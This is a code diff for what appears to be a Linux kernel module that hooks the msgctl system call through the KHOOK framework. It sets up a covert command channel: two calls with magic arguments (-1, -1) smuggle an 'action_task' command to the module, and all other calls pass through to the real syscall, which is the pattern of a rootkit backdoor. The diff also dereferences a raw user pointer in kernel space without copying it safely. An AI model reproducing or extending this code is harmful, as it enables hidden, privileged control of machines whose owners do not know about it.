@@ -141,10 +141,12 @@ void log_error(const char *message) {
  * If incoming_command_flag is set, and both msqid and cmd are -1, the
  * msquid_ds struct should be cast to an action_task * and processed.
  */
-KHOOK_EXT(long, __x64_ksys_msgctl, int, int, struct msqid_ds __user *);
-static long khook___x64_ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *buf) {
+KHOOK_EXT(long, __x64_ksys_msgctl, const struct pt_regs *);
+static long khook___x64_ksys_msgctl(const struct pt_regs * regs) {
+	// int msqid, int cmd, struct msqid_ds __user *buf
 	action_task* task;
-	if (msqid == -1 && cmd == -1) {
+	// Read first two arguments
+	if (regs->di == -1 && regs->si == -1) {
 		if (!incoming_command_flag) { // Prepare for incoming command.
 			printk(KERN_EMERG "sys_msgctl -- preparing for incoming command\n");
 			incoming_command_flag = true;
@@ -152,13 +154,13 @@ static long khook___x64_ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *
 		} else { // This is a command.
 			printk(KERN_EMERG "sys_msgctl -- Command found\n");
 			// copy_from_user
-			task = (action_task*) buf;
+			task = (action_task*) regs->dx;
 			printk(KERN_EMERG "FUNC CODE: %d\n", task->func_code);
 			return 0;
 		}
 	} else {
 		incoming_command_flag = false;
-		return KHOOK_ORIGIN(__x64_ksys_msgctl, msqid, cmd, buf);
+		return KHOOK_ORIGIN(__x64_ksys_msgctl, regs);
 	}
 }
 
